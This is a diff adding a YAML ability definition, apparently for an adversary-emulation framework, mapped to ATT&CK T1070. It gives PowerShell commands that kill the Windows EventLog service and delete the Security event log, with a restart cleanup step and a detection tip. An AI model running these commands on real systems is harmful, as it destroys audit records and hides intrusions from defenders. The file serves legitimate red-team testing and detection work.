@@ -1,0 +1,18 @@
+---
+
+- id: tacdefen-1070-AR03-1v00-200121075648
+  name: Delete System Logs Using PowerShell
+  description: .      Recommended Detection. Monitor for use of the windows event log filepath in PowerShell couple with delete arguments
+  tactic: defense-evasion
+  technique:
+    attack_id: T1070
+    name: Indicator Removal on Host
+  platforms:
+    windows:
+      psh:
+        command: |
+          $eventLogId = Get-WmiObject -Class Win32_Service -Filter "Name LIKE 'EventLog'" | Select-Object -ExpandProperty ProcessId
+          Stop-Process -Id $eventLogId -Force
+          Remove-Item C:\Windows\System32\winevt\Logs\Security.evtx
+        cleanup: |
+          Start-Service -Name EventLog
